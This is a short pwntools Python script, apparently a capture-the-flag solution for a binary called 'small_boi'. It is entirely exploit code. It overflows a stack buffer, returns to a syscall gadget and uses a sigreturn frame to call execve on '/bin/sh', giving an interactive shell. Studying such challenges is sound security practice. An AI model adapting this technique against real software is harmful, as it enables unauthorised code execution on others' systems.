# coding: utf-8
from pwn import *
p = process("./small_boi")
context.arch = "amd64"
elf = ELF("./small_boi")

binsh = next(elf.search(b"/bin/sh"))
syscallGadget = 0x0400185

frame = SigreturnFrame()
frame.rax = 59
frame.rsp = 0
frame.rbp = 0
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscallGadget

payload = b"A"*40 + p64(0x0400180)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
